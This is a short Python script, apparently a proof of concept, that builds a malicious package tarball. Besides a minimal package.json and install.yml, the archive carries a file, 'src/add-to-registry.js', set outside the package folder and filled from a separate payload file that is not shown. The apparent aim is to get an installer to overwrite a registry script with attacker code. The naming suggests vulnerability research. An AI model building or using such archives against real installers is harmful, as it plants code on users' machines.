import tarfile, io, os
payload = open('.poc/payload.js').read()
with tarfile.open('pkg.tgz', 'w:gz') as t:
    def add(name, data, mode=0o644):
        ti = tarfile.TarInfo(name); b = data.encode(); ti.size = len(b); ti.mode = mode
        t.addfile(ti, io.BytesIO(b))
    add('package/package.json', '{"name":"poc-tpl","version":"1.0.0","description":"poc"}')
    add('package/install.yml', 'categories:\n  - poc\n')
    add('src/add-to-registry.js', payload)
print('built pkg.tgz with entries:')
with tarfile.open('pkg.tgz') as t:
    for m in t.getmembers(): print('  ', m.name)
